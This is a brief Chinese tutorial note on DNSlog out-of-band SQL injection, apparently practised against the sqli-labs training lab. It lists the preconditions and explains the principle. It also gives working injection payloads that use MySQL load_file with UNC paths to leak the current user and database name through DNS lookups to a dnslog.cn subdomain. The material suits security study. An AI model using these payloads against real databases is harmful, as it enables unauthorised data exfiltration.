# DNSlog

### DNSlog条件

⭐ 数据库root权限

⭐ 数据库可读写权限，secure\_file\_priv值为空

⭐ windows系统

### 注入语句

利用DNS解析服务

<http://www.dnslog.cn/>

```sql
# 查询当前用户名
http://192.168.157.129/sql-labs/Less-1/?id=1' 
and (select load_file(concat('\\\\',(select hex(user())),'.682y4b.dnslog.cn/abc'))) --+

# 查看当前数据库名
http://192.168.157.129/sql-labs/Less-1/?id=1' 
and (select load_file(concat('\\\\',(select database()),'.682y4b.dnslog.cn/abc'))) --+

```

> '\\'在sql语句中要转义,"\\\\\\\\"转义后变成"\\\\"

> 因为不能解析含有特殊字符的域名，因此在查询用户名时最好进行hex编码

### 原理

DNS解析会把过程记录在dnslog日志中

上例子中路径`database().682y4b.dnslog.cn`需要域名解析，因此当服务器去`dnslog.cn`解析域名时候，就会在dnslog日志中留下`database()` 数据

### 适用场景

当要进行盲注时，大量的爆破可能会导致WAF封禁IP，因此可以通过DNSlog进行回显，但是条件比较苛刻一般很少遇见
